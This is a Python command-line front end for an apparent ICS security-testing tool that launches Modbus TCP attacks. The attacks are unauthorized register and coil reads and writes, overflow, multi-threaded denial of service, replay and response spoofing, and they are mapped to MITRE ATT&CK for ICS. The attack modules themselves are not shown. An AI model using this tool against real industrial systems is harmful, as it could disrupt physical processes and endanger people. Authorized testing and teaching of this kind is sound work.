#!/usr/bin/env python3
"""
M.A.T.R.I.X - Modbus Attack Tool for Remote Industrial Exploitation

A comprehensive tool for testing Modbus TCP security with various attack simulations.
"""

import argparse
import sys
import logging
import os
import json
from importlib import import_module
import subprocess
import socket
from tabulate import tabulate

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Available attack modules
AVAILABLE_ATTACKS = {
    "read": "Unauthorized read of Modbus registers and coils",
    "coil": "Unauthorized write to coils",
    "register": "Unauthorized write to holding registers",
    "overflow": "Register overflow attack",
    "dos": "Denial of Service attack",
    "replay": "Modbus traffic replay attack",
    "spoof": "Response spoofing attack"
}

def print_banner():
    """Print the tool banner"""
    banner = """
    ╔═════════════════════════════════════════════════════════╗
    ║                                                         ║
    ║     ███╗   ███╗ █████╗ ████████╗██████╗ ██╗██╗  ██╗     ║
    ║     ████╗ ████║██╔══██╗╚══██╔══╝██╔══██╗██║╚██╗██╔╝     ║
    ║     ██╔████╔██║███████║   ██║   ██████╔╝██║ ╚███╔╝      ║
    ║     ██║╚██╔╝██║██╔══██║   ██║   ██╔══██╗██║ ██╔██╗      ║
    ║     ██║ ╚═╝ ██║██║  ██║   ██║   ██║  ██║██║██╔╝ ██╗     ║
    ║     ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝     ║
    ║                                                         ║
    ║  Modbus Attack Tool for Remote Industrial Exploitation  ║
    ║                     By Karl Biron                       ║
    ╚═════════════════════════════════════════════════════════╝
    """
    print(banner)

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description='M.A.T.R.I.X - Modbus Attack Tool for Remote Industrial Exploitation')
    parser.add_argument('-H', '--host', default='localhost', help='Target Modbus server IP address (default: localhost)')
    parser.add_argument('-p', '--port', type=int, default=502, help='Target Modbus server port (default: 502)')
    parser.add_argument('-a', '--attack', choices=AVAILABLE_ATTACKS.keys(),
                        help='Type of attack to perform')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')

    # Mapping and reporting options
    parser.add_argument('--list-mappings', action='store_true',
                        help='Display MITRE ATT&CK for ICS coverage matrix (no attack execution)')
    parser.add_argument('--output', choices=['table', 'json'], default='table',
                        help='Output format for --list-mappings (default: table)')

    # Modbus-specific parameters (for read, coil, register, overflow attacks)
    parser.add_argument('--start', type=int, help='Starting address for Modbus operation (default: 0 for most attacks)')
    parser.add_argument('--count', type=int, help='Number of registers/coils to read/write (default varies by attack)')
    parser.add_argument('--unit-id', type=int, default=1, help='Modbus unit ID (default: 1)')

    # Add attack-specific arguments
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads for DoS attack (default: 100)')
    parser.add_argument('-f', '--file', help='PCAP file for replay attack')
    parser.add_argument('-s', '--spoof-ip', default='192.168.1.50', help='IP address to spoof for response spoofing')
    parser.add_argument('-i', '--interface', default='docker0', help='Network interface for packet operations')
    parser.add_argument('--standalone', action='store_true', help='Run a standalone attack module directly')

    # Web server options
    parser.add_argument('--web', action='store_true', help='Start web API server')
    parser.add_argument('--web-host', default='127.0.0.1', help='Web server bind address (default: 127.0.0.1)')
    parser.add_argument('--web-port', type=int, default=8000, help='Web server port (default: 8000)')

    args = parser.parse_args()

    # Validate that --attack is provided unless --list-mappings or --web is used
    if not args.list_mappings and not args.attack and not args.web:
        parser.error('the following arguments are required: -a/--attack (unless using --list-mappings or --web)')

    return args

def execute_attack(args):
    """Execute the selected attack based on command line arguments"""
    # Handle running in standalone mode for replay and spoof attacks
    if args.standalone and (args.attack == "replay" or args.attack == "spoof"):
        # Direct execution of the standalone attack script
        script_dir = os.path.dirname(os.path.abspath(__file__))
        
        if args.attack == "replay":
            attack_module = os.path.join(script_dir, "attacks", "modbus_replay_attack.py")
            attack_args = [
                "--host", args.host,
                "--port", str(args.port)
            ]
            
            if args.file:
                attack_args.extend(["--file", args.file])
                
        elif args.attack == "spoof":
            attack_module = os.path.join(script_dir, "attacks", "modbus_spoof_response.py")
            attack_args = [
                "--host", args.host,
                "--port", str(args.port),
                "--interface", args.interface
            ]
            
            if args.spoof_ip:
                attack_args.extend(["--spoof-ip", args.spoof_ip])
        
        if not os.path.exists(attack_module):
            logger.error(f"Attack module not found: {attack_module}")
            return 1
            
        # Execute the script directly with sudo
        cmd = ["sudo", sys.executable, attack_module] + attack_args
        logger.info(f"Executing: {' '.join(cmd)}")
        return subprocess.call(cmd)
    
    try:
        # Import the appropriate attack module
        if args.attack == "read":
            from attacks.modbus_unauthorized_read import ModbusUnauthorizedReader
            from attacks.formatter import AttackFormatter

            # Set defaults for read attack
            coil_start = args.start if args.start is not None else 0
            coil_count = args.count if args.count is not None else 8
            discrete_start = args.start if args.start is not None else 0
            discrete_count = args.count if args.count is not None else 8
            holding_start = args.start if args.start is not None else 0
            holding_count = args.count if args.count is not None else 4
            input_start = args.start if args.start is not None else 0
            input_count = args.count if args.count is not None else 4

            attacker = ModbusUnauthorizedReader(host=args.host, port=args.port, unit_id=args.unit_id)
            result = attacker.execute(
                coil_start=coil_start, coil_count=coil_count,
                discrete_start=discrete_start, discrete_count=discrete_count,
                holding_start=holding_start, holding_count=holding_count,
                input_start=input_start, input_count=input_count
            )
            AttackFormatter.format_read_result(result)

            if not result.success:
                return 1

        elif args.attack == "coil":
            from attacks.modbus_coil_write_attack import ModbusUnauthorizedCoilWriter
            from attacks.formatter import AttackFormatter

            start = args.start if args.start is not None else 0
            count = args.count if args.count is not None else 8

            attacker = ModbusUnauthorizedCoilWriter(host=args.host, port=args.port, unit_id=args.unit_id)
            result = attacker.execute(start=start, count=count)
            AttackFormatter.format_coil_write_result(result)

            if not result.success:
                return 1

        elif args.attack == "register":
            from attacks.modbus_holding_registers_write_attack import ModbusUnauthorizedHoldingRegisterWriter
            from attacks.formatter import AttackFormatter

            start = args.start if args.start is not None else 0
            count = args.count if args.count is not None else 4

            attacker = ModbusUnauthorizedHoldingRegisterWriter(host=args.host, port=args.port, unit_id=args.unit_id)
            result = attacker.execute(start=start, count=count)
            AttackFormatter.format_register_write_result(result)

            if not result.success:
                return 1

        elif args.attack == "overflow":
            from attacks.modbus_overflow_attack import ModbusOverflowAttacker
            from attacks.formatter import AttackFormatter

            start = args.start if args.start is not None else 0

            attacker = ModbusOverflowAttacker(host=args.host, port=args.port, unit_id=args.unit_id)
            result = attacker.execute(start=start)
            AttackFormatter.format_overflow_result(result)

            if not result.success:
                return 1

        elif args.attack == "dos":
            from attacks.modbus_dos_attack import ModbusDoSAttacker
            from attacks.formatter import AttackFormatter

            attacker = ModbusDoSAttacker(args.host, args.port, args.threads)
            result = attacker.execute()  # Runs until Ctrl+C
            AttackFormatter.format_dos_result(result)

            if not result.success:
                return 1

        elif args.attack == "replay":
            from attacks.modbus_replay_attack import ModbusReplyAttacker
            from attacks.formatter import AttackFormatter

            pcap_file = args.file or "ModbusTraffic.pcap"

            attacker = ModbusReplyAttacker(target_ip=args.host, target_port=args.port)
            result = attacker.execute(pcap_file=pcap_file)
            AttackFormatter.format_replay_result(result)

            if not result.success:
                return 1

        elif args.attack == "spoof":
            from attacks.modbus_spoof_response import ModbusResponseSpoofer
            from attacks.formatter import AttackFormatter

            attacker = ModbusResponseSpoofer(
                target_ip=args.host,
                target_port=args.port,
                spoof_ip=args.spoof_ip
            )
            attacker.interface = args.interface
            result = attacker.execute()
            AttackFormatter.format_spoof_result(result)

            if not result.success:
                return 1

    except ImportError as e:
        logger.error(f"Failed to import attack module: {e}")
        logger.error("Make sure all dependencies are installed")
        return 1
    except Exception as e:
        logger.error(f"Attack execution failed: {e}")
        return 1

    return 0

def list_attack_mappings(output_format='table'):
    """
    Display MITRE ATT&CK for ICS coverage matrix.

    Args:
        output_format: 'table' for human-readable table, 'json' for machine-readable JSON
    """
    from attacks.attack_mapping import ATTACK_TECHNIQUE_MAPPING, ATTACK_ICS_VERSION

    if output_format == 'json':
        # Generate JSON output - must be ONLY thing on stdout
        json_data = {
            'version': ATTACK_ICS_VERSION,
            'mappings': []
        }

        for attack_name, techniques in ATTACK_TECHNIQUE_MAPPING.items():
            for technique in techniques:
                json_data['mappings'].append({
                    'attack': attack_name,
                    'technique_id': technique['technique_id'],
                    'technique_name': technique['technique_name'],
                    'tactic': technique['tactic'],
                    'legacy_id': technique.get('legacy_id')
                })

        print(json.dumps(json_data, indent=2))
    else:
        # Generate table output
        print(f"\nMITRE ATT&CK for ICS Coverage Matrix ({ATTACK_ICS_VERSION})")
        print("=" * 100)

        table_data = []
        for attack_name, techniques in ATTACK_TECHNIQUE_MAPPING.items():
            attack_desc = AVAILABLE_ATTACKS.get(attack_name, attack_name)
            for technique in techniques:
                legacy = technique.get('legacy_id', 'N/A')
                table_data.append([
                    attack_name,
                    attack_desc,
                    technique['technique_id'],
                    technique['technique_name'],
                    technique['tactic'],
                    legacy
                ])

        headers = ['Attack', 'Description', 'Technique ID', 'Technique Name', 'Tactic', 'Legacy ID']
        print(tabulate(table_data, headers=headers, tablefmt='grid'))
        print()

def list_attacks():
    """List all available attacks with descriptions"""
    print("\nAvailable Attack Modules:")
    print("-------------------------")
    for attack, description in AVAILABLE_ATTACKS.items():
        print(f"  {attack:10} - {description}")
    print()


def start_web_server(host='127.0.0.1', port=8000):
    """
    Start the FastAPI web server.

    Args:
        host: Host to bind to (default: 127.0.0.1)
        port: Port to bind to (default: 8000)
    """
    try:
        import uvicorn
        from webapp.server import app
    except ImportError:
        logger.error("Web dependencies not installed. Run: pip install -r requirements-web.txt")
        return 1

    # Check if port is already in use
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind((host, port))
        sock.close()
    except OSError:
        # Port is in use
        print(
            f"Port {port} already in use on {host}. "
            f"Another MATRIX --web may be running; stop it or pass --web-port <N>.",
            file=sys.stderr
        )
        return 1

    # Check if binding to non-loopback address
    if host not in ['127.0.0.1', 'localhost', '::1']:
        logger.warning(
            f"⚠️  WARNING: Binding to {host} exposes an attack-capable API on the network. "
            "Use with caution in trusted environments only."
        )

    logger.info(f"Starting M.A.T.R.I.X Web API on http://{host}:{port}")
    logger.info(f"API documentation available at http://{host}:{port}/api/docs")

    # Start uvicorn server
    uvicorn.run(app, host=host, port=port, log_level="info")
    return 0

def main():
    """Main function"""
    # Parse command line arguments first to check for JSON mode
    args = parse_arguments()

    # Suppress banner and logging for JSON output mode
    if args.list_mappings and args.output == 'json':
        # In JSON mode, suppress all logging to keep stdout clean
        logging.disable(logging.CRITICAL)
        list_attack_mappings(args.output)
        return 0

    # Handle web server mode
    if args.web:
        print_banner()
        return start_web_server(host=args.web_host, port=args.web_port)

    # Normal mode: show banner and configure logging
    print_banner()

    # Set log level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    # Handle --list-mappings (non-JSON mode)
    if args.list_mappings:
        list_attack_mappings(args.output)
        return 0

    logger.info(f"Target: {args.host}:{args.port}")
    logger.info(f"Attack: {args.attack} ({AVAILABLE_ATTACKS[args.attack]})")

    # Execute the selected attack
    return execute_attack(args)

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        logger.info("\nOperation cancelled by user")
        sys.exit(0)